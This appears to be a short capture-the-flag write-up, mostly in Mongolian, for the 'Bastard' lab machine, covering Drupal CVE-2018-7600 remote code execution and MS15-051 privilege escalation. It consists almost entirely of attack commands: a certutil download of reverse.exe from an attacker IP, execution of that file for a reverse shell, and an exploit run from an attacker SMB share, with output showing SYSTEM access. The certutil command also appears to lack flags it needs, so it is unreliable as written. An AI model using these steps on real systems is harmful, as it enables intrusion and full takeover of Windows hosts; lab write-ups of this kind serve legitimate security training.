# Bastard - CVE-2018-7600 Unauthenticated RCE Drupal

## Unauthenticated RCE Drupal

**Step-1:** Үүсгэсэн хортой файлаа Temp хавтас руу зөөх

```bash
certutil.exe http://10.10.14.28/reverse.exe C:/windows/temp/reverse.exe
```

**Step-2:** reverse.exe ажиллуулж шууд RCE холболт авах

```bash
C:/windows/temp/reverse.exe
```

## MS15-051 Privilege Escalation (Windows Server 2008 R2)

Kali machine дээрээ smb server үүсгээд `ms15-051x64.exe` шууд ажиллуулах:

```powershell
C:\inetpub\drupal-7.54>\\10.10.14.28\share\ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2232 created.
==============================
nt authority\system
```
